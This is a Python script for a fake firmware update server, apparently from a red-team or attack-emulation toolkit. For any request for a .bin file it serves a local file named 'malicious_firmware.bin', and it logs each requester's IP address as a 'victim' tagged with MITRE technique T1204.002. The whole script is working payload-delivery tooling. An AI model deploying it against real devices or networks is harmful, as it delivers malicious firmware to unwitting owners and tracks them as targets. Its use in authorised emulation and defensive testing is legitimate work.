#!/usr/bin/env python3

import os
import argparse
import time
import json
from http.server import SimpleHTTPRequestHandler, HTTPServer
from datetime import datetime

LOG_FILE = "results/fake_firmware_server_log.json"
MITRE_TTP = "T1204.002"

def log(entry):
    os.makedirs("results", exist_ok=True)
    try:
        with open(LOG_FILE, "r") as f:
            data = json.load(f)
    except:
        data = []
    data.append(entry)
    with open(LOG_FILE, "w") as f:
        json.dump(data, f, indent=2)

class FirmwareServer(SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path.endswith(".bin"):
            self.send_response(200)
            self.send_header("Content-Type", "application/octet-stream")
            self.end_headers()
            with open("malicious_firmware.bin", "rb") as f:
                self.wfile.write(f.read())
            log({
                "timestamp": datetime.utcnow().isoformat(),
                "victim": self.client_address[0],
                "served_payload": "malicious_firmware.bin",
                "ttp": MITRE_TTP
            })
        else:
            self.send_response(404)
            self.end_headers()

def main():
    parser = argparse.ArgumentParser(description="Fake Firmware Update Server")
    parser.add_argument("--port", type=int, default=8088)
    args = parser.parse_args()

    os.makedirs("results", exist_ok=True)
    print(f"[+] Hosting fake firmware update on port {args.port}")
    httpd = HTTPServer(("", args.port), FirmwareServer)
    httpd.serve_forever()

if __name__ == "__main__":
    main()
